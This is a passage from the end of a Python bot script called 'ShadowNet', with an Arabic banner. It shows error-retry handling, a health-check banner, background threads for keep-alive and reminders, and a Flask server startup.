                logger.info("🔄 Waiting 30 seconds before retry...")
                time.sleep(30)
            elif "403" in error_msg:
                logger.error("❌ Token invalid or bot blocked. Please check TOKEN.")
                time.sleep(60)
            elif "Connection" in error_msg or "Timeout" in error_msg:
                logger.warning("⚠️ Network error. Retrying in 15 seconds...")
                time.sleep(15)
            else:
                logger.warning(f"⚠️ Unknown error. Retrying in 10 seconds...")
                time.sleep(10)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet - النسخة النهائية (جميع التعديلات مدمجة)")
    print(f"📌 Health Check: {SERVER_URL}/health")
    print("="*60 + "\n")

    try:
        bot.delete_webhook()
    except:
        pass

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False)
